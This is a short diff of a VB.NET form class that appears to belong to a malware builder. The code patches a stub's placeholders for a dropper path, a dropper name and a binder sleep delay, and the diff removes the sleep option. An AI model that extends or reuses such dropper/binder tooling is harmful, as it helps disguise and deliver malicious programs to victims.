@@ -17,7 +17,6 @@ Public Class Form1
     Public BinderPath As String = ""
     Public dropPath As String = ""
     Public dropName As String = ""
-    Public sleep As String = ""
     Public Shared Function getMD5Hash(ByVal B As Byte()) As String
         B = New MD5CryptoServiceProvider().ComputeHash(B)
         Dim str2 As String = ""
@@ -152,9 +151,6 @@ Public Class Form1
                                                 End If
                                                 If (str = "[DropperPath]") Then
                                                     current.Operand = dropPath
-                                                End If
-                                                If (str = "[BinderSleep]") Then
-                                                    current.Operand = sleep
                                                 End If
                                                 If (str = "[DropperName]") Then
                                                     current.Operand = dropName
@@ -311,5 +307,9 @@ Public Class Form1
         If FlatCheckBox12.Checked = True Then
             Binder.Show()
         End If
+    End Sub
+
+    Private Sub FormSkin1_Click(sender As Object, e As EventArgs) Handles FormSkin1.Click
+
     End Sub
 End Class
